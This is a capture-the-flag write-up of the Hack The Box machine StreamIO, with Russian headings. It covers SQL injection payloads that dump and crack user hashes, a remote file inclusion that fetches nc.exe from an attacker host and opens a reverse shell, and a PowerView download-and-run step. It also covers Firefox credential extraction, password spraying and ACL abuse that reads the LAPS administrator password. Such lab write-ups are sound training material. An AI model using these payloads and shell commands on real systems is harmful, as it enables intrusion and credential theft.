---
title: "[HTB] StreamIO"
permalink: /writeups/htb/streamio/
excerpt: "Краткий разбор машины StreamIO с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - sqli
  - rfi
  - web
  - laps
---

---

{% include toc icon="cog" title="StreamIO Solution" %}

The [StreamIO](https://app.hackthebox.com/machines/streamio) machine has been created by [JDgodd](https://app.hackthebox.com/users/481778) and [nikk37](https://app.hackthebox.com/users/247264). This is a **medium** Windows Machine with a strong focus on Web applications, Active Directory enumeration and exploitation. 

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
{: .text-justify}

![image-center](/images/htb/htb_streamio_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.207.221
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 15:16 EDT
Nmap scan report for 10.129.207.221
Host is up (0.035s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-28 02:16:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

This computer seems to be a domain controller for **streamio.htb** and we also have a couple of web-related ports, **HTTP** (80/TCP) and **HTTPS** (443/TCP).

## HTTP-разведка

Let's check this website, but before that we will add the domain to our `/etc/hosts` file with the following command:
- `echo "10.129.207.221 streamio.htb" | sudo tee --append /etc/hosts`

Then, we can connect to the website **https://streamio.htb**.

![image-center](/images/htb/htb_streamio_website.png){: .align-center}

We can see we also have a login page, but we will check that later. If we check the certificate, we can see another host **watch.streamio.htb** in the Subject Alt Names (SAN):

![image-center](/images/htb/htb_streamio_cert.png){: .align-center}

Let's add this subdomain to our `/etc/hosts`:
- `echo "10.129.207.221 watch.streamio.htb" | sudo tee --append /etc/hosts`

Then, we can go to **https://watch.streamio.htb**.

![image-center](/images/htb/htb_streamio_watch.png){: .align-center}

If we run [dirbuster](https://www.kali.org/tools/dirbuster/), a Web content scanner, with a common word list we can discover the following URL: https://watch.streamio.htb/search.php.

![image-center](/images/htb/htb_streamio_dirbuster.png){: .align-center}

Let's see if we can find something on this webpage.

# SQL Injection

By looking at the **https://watch.streamio.htb/search.php** page, we discovered that the search feature contained an SQL injection. An SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

It can be triggered with the following input `1337' UNION SELECT 1,2,3,4,5,6 -- -`.

![image-center](/images/htb/htb_streamio_sqli.png){: .align-center}

We could try to use [sqlmap](https://github.com/sqlmapproject/sqlmap), a testing tool that automates the process of detecting and exploiting SQL injection flaws. However, there is some kind of WAF in front of the application.

![image-center](/images/htb/htb_streamio_waf.png){: .align-center}

While we could fine-tune the `sqlmap` parameters, let’s do this manually. First, we need to know which kind of database we are facing. It can be done with the following request `1337' UNION SELECT 1,@@version,3,4,5,6 -- -`.

![image-center](/images/htb/htb_streamio_sqlv.png){: .align-center}

Okay, it's MSSQL. Now, after a few custom request, we will be able to gather some password hashes. Here we used the following ones:

```sql
/* Get the DB name (STREAMIO) */
1337' UNION SELECT 1,(select DB_NAME()),3,4,5,6-- -
/* Get the tables (movies,users) */
1337' UNION SELECT 1, (SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6-- -
/* Get the columns (password, username) */
1337' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
/* Dump the content */
1337' UNION SELECT 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```

We obtained the following output:

```text
admin 665a50ac9eaa781e4f7f04199db97a11
Alexendra 1c2b3d8270321140e5153f6637d3ee53
Austin 0049ac57646627b8d7aeaccf8b6a936f
Barbra 3961548825e3e21df5646cafe11c6c76
Barry 54c88b2dbd7b1a84012fabc1a4c73415
Baxter 22ee218331afd081b0dcd8115284bae3
Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon 35394484d89fcfdb3c5e447fe749d213
Clara ef8f3d30a856cf166fb8215aca93e9ff
Diablo ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield 8097cedd612cc37c29db152b6e9edbd3
Gloria 0cfaaaafb559f081df2befbe66686de0
James c660060492d9edcaa8332d89c99c9239
Juliette 6dcd87740abb64edfa36d170f0d5450d
Lauren 08344b85b329d7efd611b7a7743e8a09
Lenord ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer 7df45a9e3de3863807c026ba48e55fb3
Michelle b83439b16f844bd6ffe35c02fe21b3c0
Oliver fd78db29173a5cf701bd69027cb9bf6b
Robert f03b910e2bd0313a23fdd7575f34a694
Robin dc332fb5576e9631c9dae83f194f8e70
Sabrina f87d3c0d6c8fd686aacc6627f1f493a5
Samantha 083ffae904143c4796e464dac33c1f7d
Stan 384463526d288edcc95fc3701e523bc7
Thane 3577c47eb1e12c8ba021611e1280753c
Theodore 925e5408ecb67aea449373d668b7359e
Victor bf55e15b119860a6e6b5a164377da719
Victoria b22abb47a02b52d5dfa27fb0b534f693
William d62be0dc82071bccc1322d64ec5b6c51
yoshihide b779ba15cedfd22a023c4d8bcf5f2332
```

Using a well-known website, [https://crackstation.net](https://crackstation.net), we obtained the following cleartext passwords.

```bash
admin:paddpadd
Barry:$hadoW
Bruno:$monique$1991$
Clara:%$clara
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

Let's see if one of these accounts is valid.

## Дополнительная разведка

Back to **https://streamio.htb**, we were able to connect to the website with `yoshihide:66boysandgirls..`. However, we found nothing interesting. Let's do a bit more recon with [gobuster](https://github.com/OJ/gobuster).

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://streamio.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/27 16:01:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
```

The **https://streamio.htb/admin/** page seems interesting, let's take a look after login as `yoshihide`.

![image-center](/images/htb/htb_streamio_admin.png){: .align-center}

We have a few functionalities available but none of them were really helpful. 

Using [ffuf](https://github.com/ffuf/ffuf), another web fuzzer, we will try to discover hidden functionality. Here we used the following list from the famous **SecLists** repository:

- [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt)

**Заметка:** We used the `--fs 1678` flag to avoid getting too many false positive.
{: .notice--info}

Don't forget to recover the **PHPSESSID** of `yoshihide` to run an authenticated scan. This can be done directly in your web browser.

```bash
$ ffuf -w burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=ij79jktnjnlbkauguc6t42mmg0 --fs 1678

...[snip]...

[Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 32ms]
    * FUZZ: debug

[Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 53ms]
    * FUZZ: movie

[Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 47ms]
    * FUZZ: staff

[Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 32ms]
    * FUZZ: user

:: Progress: [6453/6453] :: Job [1/1] :: 1047 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

It seems that we got a **debug** feature at **https://streamio.htb/admin/?debug=**.

![image-center](/images/htb/htb_streamio_debug.png){: .align-center}

After looking around for a while, we were able to get the source code of some pages using a [PHP wrapper](https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter). Here is an example with **index.php** which contains the password for the database:

- https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
    header('HTTP/1.1 403 Forbidden');
    die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>

...[snip]...
```

It is an interesting finding, but we can’t really go further with this information. Let's continue to explore the web application.

# Remote File Inclusion

Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. 

## Дополнительная разведка

Again, we will use `gobuster`, this time with the `-x php` switch to try to discover interesting web pages to read with the **debug** feature.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://streamio.htb/admin/ -x php -c "PHPSESSID=ij79jktnjnlbkauguc6t42mmg0"

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Cookies:                 PHPSESSID=ij79jktnjnlbkauguc6t42mmg0
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/27 16:19:08 Starting gobuster in directory enumeration mode
===============================================================

...[snip]...

/CSS                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/CSS/]
/JS                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/JS/]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/Master.php           (Status: 200) [Size: 58]

...[snip]...
```

Here we have the following web page: **https://streamio.htb/admin/master.php**

## Code Analysis

We can download the code in base64 with the following request:

- https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

After decoding the result, we obtained the following code:

```php
...[snip]...

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?> 
```

Here, we have an RFI vulnerability in the *file_get_contents()* function of the **master.php** page. We can generate a POST request to */admin/?debug=master.php* with the **include** parameters pointing to our backdoor.

We just need to create a malicious PHP file like:

```php
system("curl 10.10.14.101/nc.exe -o c:\\Windows\\Temp\\nc.exe");
system("c:\\windows\\temp\\nc.exe 10.10.14.101 4321 -e cmd.exe");
```

Don't forget to set a listener on the attacking machine with `sudo nc -nlvp 4321`. Then, using Burp proxy, we can craft a POST request:

![image-center](/images/htb/htb_streamio_burp.png){: .align-center}

We have a remote shell!

```bash
$ sudo nc -nlvp 4321
[sudo] password for ax: 
listening on [any] 4321 ...
connect to [10.10.14.101] from (UNKNOWN) [10.129.207.221] 49727
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\streamio.htb\admin>
```

# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives. With our current shell, let's see if we can find something interesting.

## Playing with MSSQL

After looking around for a while, we decided to take a look at the database as we previously found DB credentials (`db_admin:B1@hx31234567890`) in **index.php**. Note that you should upgrade your shell to PowerShell to avoid any issues when connecting to the DB.

```bash
C:\inetpub\streamio.htb\admin>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;'
                                                                                                                                
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          

(1 rows affected)
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
```

After listing the databases, we found an interesting one, **STREAMIO_BACKUP**.

```bash
PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; SELECT username,password FROM users;'
sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
Changed database context to 'streamio_backup'.
username                                           password                                          
-------------------------------------------------- --------------------------------------------------
nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
James                                              c660060492d9edcaa8332d89c99c9239                  
Theodore                                           925e5408ecb67aea449373d668b7359e                  
Samantha                                           083ffae904143c4796e464dac33c1f7d                  
Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
William                                            d62be0dc82071bccc1322d64ec5b6c51                  
Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

Nice! Again, with [https://crackstation.net](https://crackstation.net), we obtained the following plaintext passwords.

![image-center](/images/htb/htb_streamio_crack.png){: .align-center}

By looking at the discovered users permission, we can see that **nikk37** (`nikk37:get_dem_girls2@yahoo.com`) has remote management privileges.

```bash
PS C:\inetpub\streamio.htb\admin> net users nikk37
net users nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:57:16 AM
Password expires             Never
Password changeable          2/23/2022 1:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 2:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users  
```    

Now, with `crackmapexec`, let's try to use WinRM (TCP/5985) and see if we effectively have a remote access.

```bash
$ crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         streamio.htb    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        streamio.htb    5985   DC               [*] http://streamio.htb:5985/wsman
WINRM       streamio.htb    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)

```

Awesome, this time we can use `evil-winrm` and grab the **first flag.

```bash
$ evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\nikk37\Documents> ls ..\Desktop


    Directory: C:\Users\nikk37\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/27/2023   7:14 PM             34 user.txt
```

## Дополнительная разведка с winPEAS

Here, with [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS), we can scan the machine for information and potential privilege escalation paths.

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload /home/ax/Downloads/winPEASx64.exe
Info: Uploading /home/ax/Downloads/winPEASx64.exe to C:\Users\nikk37\Documents\winPEASx64.exe
                                  
Data: 2702676 bytes of 2702676 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\nikk37\Documents> .\winPEASx64.exe

...[snip]...

LAPS Settings
If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: 1
    LAPS Admin Account Name: 
    LAPS Password Complexity: 4
    LAPS Password Length: 14
    LAPS Expiration Protection Enabled: 1

...[snip]...

Looking for Firefox DBs
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

...[snip]...
```

So, **LAPS** is enabled and we have a Firefox database which may contain credentials. We tried the suggested tool, [SharpWeb](https://github.com/djhohnstein/SharpWeb), but it did not work.

We found another tool to do the job, [firepwd](https://github.com/lclevy/firepwd), but we need to download some files locally.

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> cd C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download key4.db
Info: Downloading key4.db to ./key4.db
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download logins.json
Info: Downloading logins.json to ./logins.json
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release>
```

Now, we just have to put these file in the same directory as the tool and recover the credentials.

```bash
$ python3 firepwd.py

...[snip]...

https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Let's put these credentials in a text file somewhere, we may need them later.

## BloodHound

With a valid account, we can also use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u nikk37 -p get_dem_girls2@yahoo.com -d streamIO.htb -ns 10.129.207.221 --zip
INFO: Found AD domain: streamio.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.streamio.htb
INFO: Found 8 users
INFO: Found 54 groups
INFO: Found 4 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20230427164604_bloodhound.zip
```

By looking at the BloodHound output, we can see that one of the previously recovered account **JDgodd** have the *Owns* privileges on **CORE STAFF@STREAMIO.HTB** and this group can read LAPS passwords!

![image-center](/images/htb/htb_streamio_bloodhound.png){: .align-center}

However, after trying the `JDgodd:password@12` credentials, it did not work...

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Password spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain.

Since we have a list of usernames and passwords, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if we can get another account.

```bash
$ crackmapexec smb streamio.htb -u users.txt -p pass.txt               

...[snip]...

SMB         streamio.htb    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

Yay! We found valid credentials for **JDgodd**! Now, we can try to abuse its current privileges to read LAPS password.

## Owning the domain

Here, the user **JDGODD@STREAMIO.HTB** has the ability to modify the owner of the group **CORE STAFF@STREAMIO.HTB**. It means that we can take over this group and add **JDgodd** in it.

This can easily be done using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

```bash
*Evil-WinRM* PS C:\Users\nikk37\Documents> IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.101/PowerView.ps1')
*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> net group 'CORE STAFF'
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\Documents> 
```

Now that we are part of the **CORE STAFF@STREAMIO.HTB** group, we can use `ldapsearch` to query the **ms-MCS-AdmPwd** attribute of the domain controller.


```bash
$ ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://10.129.207.221 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: p-294I{bf,t2a1
```

Finally, we can connect as administrator on the box and grab the **second flag**.

```bash
$ evil-winrm -i streamio.htb -u administrator -p 'p-294I{bf,t2a1'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls C:\users\martin\desktop


    Directory: C:\users\martin\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/27/2023   7:14 PM             34 root.txt
```

Awesome! I hope you enjoyed it, I know I did :)
